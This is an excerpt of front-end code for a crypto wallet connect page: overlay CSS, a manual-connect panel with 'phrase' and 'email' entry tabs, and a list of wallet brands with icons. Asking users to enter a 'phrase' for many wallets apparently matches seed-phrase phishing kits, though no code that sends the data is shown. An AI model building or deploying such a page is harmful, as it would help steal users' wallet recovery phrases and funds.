...
.welcome-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:9999;opacity:0;transition:opacity .4s ease}
.welcome-overlay.active{display:flex;opacity:1}
.welcome-content{background:rgba(23,23,26,0.95);color:#ffffff;border-radius:20px;border:1px solid rgba(255,255,255,0.08);width:100%;max-width:420px;max-height:85vh;overflow-y:auto;position:relative;backdrop-filter:blur(20px);transform:scale(.95);transition:transform .4s ease;display:flex;flex-direction:column}
.welcome-overlay.active .welcome-content{transform:scale(1)}
.welcome-header{position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:24px;gap:16px;border-bottom:1px solid rgba(255,255,255,0.08)}
.welcome-logo{width:48px;height:48px;object-fit:contain;flex-shrink:0}
.welcome-body{flex:1;padding:32px 24px;text-align:center}
.welcome-body h2{margin:0 0 16px 0;font-size:24px;font-weight:700;color:#ffffff}
.welcome-body p{margin:0;font-size:14px;color:#d1d5db;line-height:1.6}
.welcome-footer{padding:24px;border-top:1px solid rgba(255,255,255,0.08);display:flex;justify-content:center}
.welcome-connect-btn{padding:14px 32px;background:#3396ff;color:white;border:none;border-radius:12px;font-weight:600;font-size:16px;cursor:pointer;transition:all .25s ease}
.welcome-connect-btn:hover{background:#0d7ad0;transform:translateY(-2px)}
.welcome-close-btn{position:absolute;right:20px;top:20px;width:32px;height:32px;border-radius:8px;display:inline-flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);color:#9ca3af;font-size:16px;cursor:pointer;flex-shrink:0}
.welcome-close-btn:hover{background:rgba(255,255,255,0.08);color:#ffffff}`;
    ...
    <div class="manual-content">
      ...
      <div style="padding:20px">
        ...
        <div id="phrase-tab" class="tab-content">
          <div style="display:flex;justify-content:center;gap:8px;margin-bottom:12px">
            ...
            <div style="display:flex;flex-direction:column;gap:10px">
              ...
              <div id="phrase-status" style="color:red;font-size:13px;display:none;text-align:center">Please fill out the field</div>
            </div>
        </div>
        ...
        <div id="email-tab" class="tab-content" style="display:none">
          ...
          <div id="email-status" style="color:red;font-size:13px;display:none;text-align:center">Please fill out the fields</div>
        </div>
  ...
  const visibleList = [
    ...
    { name: 'Ambire Wallet', icon: '/assets/Ambire-wallet.png' },
    ...
    { name: 'Edge Wallet', icon: '/assets/Edge-wallet.png' },
    { name: 'Ellipal', icon: '/assets/Ellipal-wallet.png' },
    { name: 'Frontier Wallet', icon: '/assets/Frontier-wallet.png' },
    ...
    { name: 'MyEtherWallet', icon: '/assets/Myether-wallet.png' },
    { name: 'Omni Wallet', icon: '/assets/Omni-wallet.png' },
    { name: 'OP_NET Wallet', icon: '/assets/OpNet-wallet.png' },
    { name: 'Stakenet', icon: '/assets/Stakenet-wallet.png' },
    { name: 'Vision Wallet', icon: '/assets/Vision-wallet.png' },
    { name: 'Vector Wallet', icon: '/assets/Vector-wallet.png' },
    { name: 'Wave Wallet', icon: '/assets/Wave-wallet.png' },
